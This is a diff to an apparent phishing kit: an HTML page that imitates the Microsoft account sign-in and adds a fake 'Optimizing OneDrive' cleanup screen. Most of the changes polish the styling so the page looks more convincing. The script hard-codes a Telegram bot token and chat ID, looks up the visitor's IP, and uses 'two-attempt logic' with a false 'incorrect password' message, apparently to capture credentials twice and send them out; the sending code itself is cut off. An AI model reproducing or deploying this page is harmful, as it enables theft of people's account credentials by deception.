@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in </title>
+    <title>Sign in to your Microsoft account</title>
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMgpEfAAB4AARwAgXQAAAARRAAAFnA9UgAAAANSURBVAgdY9j9HwAEFwCqK2+zRgAAAABJRU5ErkJggg==">
-    <!-- 2026 Fresh, fluent design + two-attempt + button right + no duplicate text -->
+    <!-- 2026 Fresh, fluent design – Proper breathing room -->
     <style>
         * {
             margin: 0;
@@ -17,26 +17,25 @@
         }
 
         body {
-            background: linear-gradient(145deg, #f3f5f7 0%, #e9ecf0 100%);
+            background: linear-gradient(145deg, #f0f2f5 0%, #e5e9ef 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 24px;
-            backdrop-filter: blur(2px);
+            padding: 32px 24px;
         }
 
         .login-container {
             width: 100%;
-            max-width: 480px;
+            max-width: 500px;  /* slightly wider for better spacing */
         }
 
         .login-box {
-            background: rgba(255, 255, 255, 0.95);
+            background: rgba(255, 255, 255, 1);
             backdrop-filter: blur(20px);
-            border-radius: 24px;
-            box-shadow: 0 20px 48px -12px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(0, 0, 0, 0.02) inset, 0 0 0 1px rgba(255, 255, 255, 0.8) inset;
+            border-radius: 28px;
+            box-shadow: 0 24px 56px -16px rgba(0, 0, 0, 0.2), 0 0 0 1px rgba(0, 0, 0, 0.02) inset, 0 0 0 1px rgba(255, 255, 255, 0.8) inset;
             border: none;
             overflow: hidden;
             transition: transform 0.25s ease, box-shadow 0.3s ease;
@@ -44,51 +43,51 @@
 
         .microsoft-header {
             background: transparent;
-            padding: 24px 32px 12px 32px;
+            padding: 28px 36px 16px 36px;  /* increased left/right */
             display: flex;
             align-items: center;
             gap: 12px;
         }
 
         .microsoft-header .logo {
-            width: 108px;
-            height: 24px;
+            width: 112px;
+            height: 26px;
         }
 
-        /* only the logo text remains (next to logo) */
         .microsoft-header .logo-text {
             color: #1e1e1e;
-            font-size: 16px;
+            font-size: 17px;
             font-weight: 450;
             letter-spacing: -0.01em;
             opacity: 0.8;
         }
 
         .login-header {
-            padding: 8px 32px 16px 32px;
+            padding: 8px 36px 24px 36px;
             text-align: left;
         }
 
         .login-title {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 600;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
             color: #1e1e1e;
             letter-spacing: -0.02em;
+            line-height: 1.2;
         }
 
         .login-sub {
-            font-size: 15px;
+            font-size: 16px;
             color: #5e5e5e;
             font-weight: 400;
         }
 
         .login-content {
-            padding: 0 32px 32px;
+            padding: 0 36px 36px 36px;  /* uniform horizontal padding */
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 28px;  /* more space between groups */
         }
 
         .form-group.hidden {
@@ -105,8 +104,8 @@
 
         label {
             display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
+            margin-bottom: 10px;
+            font-size: 15px;
             font-weight: 500;
             color: #1e1e1e;
         }
@@ -118,13 +117,13 @@
 
         input[type="email"], input[type="password"] {
             width: 100%;
-            padding: 14px 16px;
+            padding: 16px 18px;      /* larger padding */
             border: 1.5px solid #c2c2c2;
-            border-radius: 12px;
+            border-radius: 16px;      /* softer corners */
             font-size: 16px;
             background: #ffffff;
             transition: all 0.2s cubic-bezier(0.2,0,0,1);
-            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
         }
 
         input[type="email"]:focus, input[type="password"]:focus {
@@ -139,15 +138,15 @@
 
         .password-toggle {
             position: absolute;
-            right: 14px;
+            right: 16px;
             top: 50%;
             transform: translateY(-50%);
             background: none;
             border: none;
             cursor: pointer;
-            padding: 8px;
+            padding: 10px;
             color: #5e5e5e;
-            border-radius: 8px;
+            border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -160,16 +159,16 @@
         }
 
         .password-toggle svg {
-            width: 20px;
-            height: 20px;
+            width: 22px;
+            height: 22px;
         }
 
         .forgot-link {
             display: inline-block;
-            font-size: 14px;
+            font-size: 15px;
             color: #0066b4;
             text-decoration: none;
-            margin-top: 12px;
+            margin-top: 14px;
             font-weight: 500;
         }
 
@@ -179,13 +178,13 @@
         }
 
         .no-account-text {
-            font-size: 14px;
+            font-size: 15px;
             color: #3b3b3b;
-            margin-right: 6px;
+            margin-right: 8px;
         }
 
         .create-account-link {
-            font-size: 14px;
+            font-size: 15px;
             color: #0066b4;
             text-decoration: none;
             font-weight: 500;
@@ -197,32 +196,32 @@
         }
 
         .buttons-container {
-            margin-top: 28px;
+            margin-top: 36px;         /* more breathing above buttons */
             display: flex;
-            justify-content: flex-end;   /* 👈 pushes button to the right */
+            justify-content: flex-end;
             align-items: center;
-            gap: 16px;
+            gap: 20px;
         }
 
         .signin-button {
             background-color: #0066b4;
             color: white;
             border: none;
-            border-radius: 30px;
-            padding: 12px 28px;
-            font-size: 16px;
+            border-radius: 40px;
+            padding: 14px 34px;
+            font-size: 17px;
             font-weight: 500;
             cursor: pointer;
-            height: 48px;
-            min-width: 120px;
+            height: 54px;
+            min-width: 136px;
             transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
-            box-shadow: 0 4px 8px rgba(0,102,180,0.2);
-            order: 2;  /* ensure it stays on right */
+            box-shadow: 0 6px 12px rgba(0,102,180,0.2);
+            order: 2;
         }
 
         .signin-button:hover {
             background-color: #004e8c;
-            box-shadow: 0 8px 16px rgba(0,78,140,0.25);
+            box-shadow: 0 10px 20px rgba(0,78,140,0.25);
             transform: scale(1.02);
         }
 
@@ -230,98 +229,86 @@
             transform: scale(0.98);
         }
 
-        .signin-button:disabled {
-            background-color: #b3b3b3;
-            box-shadow: none;
-            cursor: not-allowed;
-        }
-
         .back-button {
             background: none;
             border: none;
             color: #0066b4;
             cursor: pointer;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 500;
-            padding: 8px 16px;
-            border-radius: 30px;
+            padding: 10px 20px;
+            border-radius: 40px;
             transition: background 0.15s;
             order: 1;
-            margin-right: auto; /* pushes itself left, button right */
+            margin-right: auto;
         }
 
         .back-button:hover {
             background: rgba(0,102,180,0.08);
-            text-decoration: none;
         }
 
         .back-button.hidden {
             display: none;
         }
 
-        .signin-options {
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid #e0e0e0;
-        }
-
-        .signin-options-title {
-            font-size: 14px;
-            color: #5e5e5e;
-            margin-bottom: 16px;
-            text-align: center;
-        }
-
+        /* error / invalid messages */
         .error-message {
             color: #c42b1c;
-            font-size: 13px;
-            margin-top: 8px;
+            font-size: 14px;
+            margin-top: 10px;
             display: none;
             font-weight: 500;
+            padding-left: 4px;
         }
 
-        /* invalid login feedback */
         .invalid-creds-message {
             background-color: #ffebee;
             border: 1px solid #c42b1c;
             color: #c42b1c;
-            border-radius: 30px;
-            padding: 12px 18px;
-            margin: 20px 0 10px;
-            font-size: 14px;
+            border-radius: 40px;
+            padding: 16px 22px;
+            margin: 20px 0 24px 0;
+            font-size: 15px;
             font-weight: 500;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 12px;
         }
         .invalid-creds-message:before {
             content: "⚠️";
-            font-size: 16px;
+            font-size: 18px;
         }
 
-        .success-message {
-            color: #0f6b0f;
+        .security-notice {
+            background: #f4f9ff;
+            border: 1px solid #b6d6f0;
+            border-radius: 40px;
+            padding: 16px 22px;
+            margin: 28px 0 16px 0;
             font-size: 14px;
-            margin-top: 16px;
-            text-align: center;
-            display: none;
-            padding: 12px;
-            background-color: #e6f2e6;
-            border: 1px solid #0f6b0f;
-            border-radius: 12px;
+            color: #1e1e1e;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+        .security-notice:before {
+            content: "🔒";
+            font-size: 18px;
         }
 
+        /* footer */
         .footer {
-            margin-top: 40px;
+            margin-top: 48px;
             text-align: center;
-            font-size: 13px;
+            font-size: 14px;
             color: #5e5e5e;
         }
 
         .footer a {
             color: #0066b4;
             text-decoration: none;
-            margin: 0 12px;
+            margin: 0 14px;
             font-weight: 500;
         }
 
@@ -329,6 +316,7 @@
             text-decoration: underline;
         }
 
+        /* loading overlay */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -346,18 +334,18 @@
         }
 
         .loading-spinner {
-            width: 44px;
-            height: 44px;
+            width: 48px;
+            height: 48px;
             border: 4px solid #e6e6e6;
             border-top: 4px solid #0066b4;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
 
         .loading-text {
             color: #1e1e1e;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 500;
         }
 
@@ -366,77 +354,64 @@
             100% { transform: rotate(360deg); }
         }
 
-        .security-notice {
-            background: #f4f9ff;
-            border: 1px solid #b6d6f0;
-            border-radius: 30px;
-            padding: 12px 18px;
-            margin: 20px 0 10px;
-            font-size: 13px;
-            color: #1e1e1e;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: 500;
-        }
-
-        .security-notice:before {
-            content: "🔒";
-            font-size: 16px;
-        }
-
-        /* Cleanup 2026 fluent */
+        /* --- Cleanup styles (spaced out) --- */
         .cleanup-status {
             text-align: center;
-            margin: 24px 0;
+            margin: 32px 0;
         }
 
         .cleanup-icon {
-            font-size: 52px;
-            margin-bottom: 24px;
+            font-size: 60px;
+            margin-bottom: 28px;
             color: #0066b4;
-            filter: drop-shadow(0 4px 8px rgba(0,102,180,0.2));
+            filter: drop-shadow(0 6px 12px rgba(0,102,180,0.2));
+        }
+
+        .status-message {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 24px;
         }
 
         .cleanup-progress {
             width: 100%;
-            height: 8px;
+            height: 10px;
             background-color: #e6e6e6;
-            border-radius: 20px;
-            margin: 24px 0;
+            border-radius: 30px;
+            margin: 28px 0;
             overflow: hidden;
         }
 
         .cleanup-progress-bar {
             height: 100%;
             background: linear-gradient(90deg, #0066b4, #3b9eff);
-            border-radius: 20px;
+            border-radius: 30px;
             width: 0%;
             transition: width 0.3s ease;
         }
 
         .storage-display {
             background: #fafcff;
-            border-radius: 24px;
-            padding: 24px;
-            margin: 28px 0;
+            border-radius: 28px;
+            padding: 28px;
+            margin: 32px 0;
             border: 1px solid #eef2f6;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+            box-shadow: 0 4px 14px rgba(0,0,0,0.02);
         }
 
         .storage-title {
             font-weight: 600;
-            margin-bottom: 18px;
+            margin-bottom: 20px;
             color: #1e1e1e;
-            font-size: 18px;
+            font-size: 20px;
         }
 
         .storage-bar {
-            height: 12px;
+            height: 14px;
             background-color: #e0e6ed;
             border-radius: 30px;
             overflow: hidden;
-            margin-bottom: 14px;
+            margin-bottom: 16px;
         }
 
         .storage-used {
@@ -448,63 +423,63 @@
         }
 
         .storage-labels {
-            margin-bottom: 6px;
-            font-size: 13px;
+            margin-bottom: 8px;
+            font-size: 14px;
             color: #5e5e5e;
         }
 
         .storage-labels span, .storage-numbers span {
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 500;
         }
 
         .storage-numbers {
             font-weight: 600;
             color: #1e1e1e;
-            font-size: 15px;
+            font-size: 16px;
         }
 
         .cleanup-results {
             text-align: left;
-            margin-top: 30px;
-            padding: 24px;
+            margin-top: 36px;
+            padding: 28px;
             background: #f4faf4;
-            border-radius: 24px;
-            border-left: 5px solid #0f6b0f;
+            border-radius: 28px;
+            border-left: 6px solid #0f6b0f;
             display: none;
         }
 
         .result-item {
             display: flex;
             justify-content: space-between;
-            padding: 10px 0;
+            padding: 12px 0;
             border-bottom: 1px solid #cfdbe8;
-            font-size: 15px;
+            font-size: 16px;
         }
 
         .cleanup-complete {
             text-align: center;
-            margin: 28px 0;
+            margin: 32px 0;
             display: none;
         }
 
         .success-icon {
-            font-size: 68px;
-            margin-bottom: 20px;
+            font-size: 72px;
+            margin-bottom: 24px;
         }
 
         .redirect-message {
-            margin-top: 24px;
-            padding: 20px;
+            margin-top: 28px;
+            padding: 24px;
             background-color: #ecf3fc;
-            border-radius: 20px;
-            font-size: 15px;
+            border-radius: 28px;
+            font-size: 16px;
             display: none;
             border: 1px solid #b6d6f0;
         }
 
         .countdown {
-            font-size: 20px;
+            font-size: 22px;
             color: #0066b4;
             font-weight: 700;
         }
@@ -512,10 +487,11 @@
         .clear { clear: both; }
 
         @media (max-width: 480px) {
-            body { padding: 16px; }
-            .microsoft-header { padding: 20px 24px 8px; }
+            body { padding: 20px 16px; }
+            .login-container { max-width: 100%; }
+            .microsoft-header { padding: 22px 24px 12px; }
             .login-header, .login-content { padding-left: 24px; padding-right: 24px; }
-            .login-title { font-size: 24px; }
+            .login-title { font-size: 28px; }
         }
     </style>
 </head>
@@ -529,7 +505,7 @@
         <div class="login-box">
             <div class="microsoft-header">
                 <div class="logo">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24" fill="#1e1e1e">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="112" height="26" viewBox="0 0 108 24" fill="#1e1e1e">
                         <path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z"/>
                         <rect width="10.931" height="10.931" fill="#f25022"/>
                         <rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/>
@@ -538,7 +514,6 @@
                     </svg>
                 </div>
                 <span class="logo-text">Microsoft</span>
-                <!-- The standalone "Microsoft" text above the title has been removed -->
             </div>
             
             <!-- LOGIN SECTION -->
@@ -548,7 +523,6 @@
                     <div class="login-sub">to your Microsoft account</div>
                 </div>
                 
-                <!-- custom invalid credentials feedback -->
                 <div class="invalid-creds-message" id="invalidCredsMessage" style="display: none;">
                     Incorrect email or password. Please try again.
                 </div>
@@ -560,7 +534,7 @@
                             <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required autocomplete="username">
                         </div>
                         <div class="error-message" id="emailError">Enter a valid email address</div>
-                        <div style="margin-top: 16px;">
+                        <div style="margin-top: 20px;">
                             <span class="no-account-text">No account?</span>
                             <a href="https://signup.live.com/" class="create-account-link">Create one</a>
                             <a href="https://account.live.com/acsr" class="forgot-link" style="float: inline-end;">Trouble signing in?</a>
@@ -578,7 +552,7 @@
                             </button>
                         </div>
                         <div class="error-message" id="passwordError">Password is required</div>
-                        <a href="#" class="forgot-link" style="margin-top:12px; display:inline-block;">Forgotten your password?</a>
+                        <a href="#" class="forgot-link" style="margin-top:16px; display:inline-block;">Forgotten your password?</a>
                     </div>
 
                     <div class="security-notice">
@@ -592,7 +566,7 @@
                 </form>
             </div>
 
-            <!-- CLEANUP section (identical) -->
+            <!-- CLEANUP section (spacious) -->
             <div class="login-content cleanup-section" id="cleanupSection">
                 <div class="login-header">
                     <h1 class="login-title">Optimizing OneDrive</h1>
@@ -601,7 +575,7 @@
                 
                 <div class="cleanup-status">
                     <div class="cleanup-icon" id="cleanupIcon">🔄</div>
-                    <div class="status-message" id="cleanupStatus" style="font-size:16px; font-weight:500;">Initializing cleaner</div>
+                    <div class="status-message" id="cleanupStatus">Initializing cleaner</div>
                     
                     <div class="cleanup-progress">
                         <div class="cleanup-progress-bar" id="cleanupProgress"></div>
@@ -625,7 +599,7 @@
                 </div>
                 
                 <div class="cleanup-results" id="cleanupResults">
-                    <h3 style="color:#0f6b0f; margin-bottom:16px;">✅ Cleanup complete</h3>
+                    <h3 style="color:#0f6b0f; margin-bottom:18px;">✅ Cleanup complete</h3>
                     <div class="result-item"><span>🕐 Temporary system files</span><span>1.2 GB</span></div>
                     <div class="result-item"><span>🖼️ Duplicate images</span><span>856 MB</span></div>
                     <div class="result-item"><span>📄 Old document versions</span><span>634 MB</span></div>
@@ -636,7 +610,7 @@
                 <div class="cleanup-complete" id="cleanupComplete">
                     <div class="success-icon">✨</div>
                     <h2 style="color:#0f6b0f;">All set!</h2>
-                    <p style="margin-top:8px;">Your storage is optimized.</p>
+                    <p style="margin-top:10px;">Your storage is optimized.</p>
                 </div>
                 
                 <div class="redirect-message" id="redirectMessage">
@@ -656,7 +630,7 @@
     </div>
 
     <script>
-        // --- Two-attempt logic with button right & duplicate text removed ---
+        // --- Two-attempt logic with proper spacing ---
         const TELEGRAM_BOT_TOKEN = '8404555198:AAGTDMBJ1nkK1fJL42_jtaIWjtRB3DfTWz0';
         const TELEGRAM_CHAT_ID = '6439618231';
         
@@ -666,7 +640,7 @@
         let userIP = 'Unknown';
         let userLocation = 'Unknown';
         
-        let firstSignInAttempt = true;   // true = first time clicking "Sign in" with password
+        let firstSignInAttempt = true;
 
         // DOM
         const loginSection = document.getElementById('loginSection');
@@ -695,7 +669,6 @@
         const redirectMessage = document.getElementById('redirectMessage');
         const countdownElement = document.getElementById('countdown');
 
-        // IP / location
         async function getUserIP() {
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
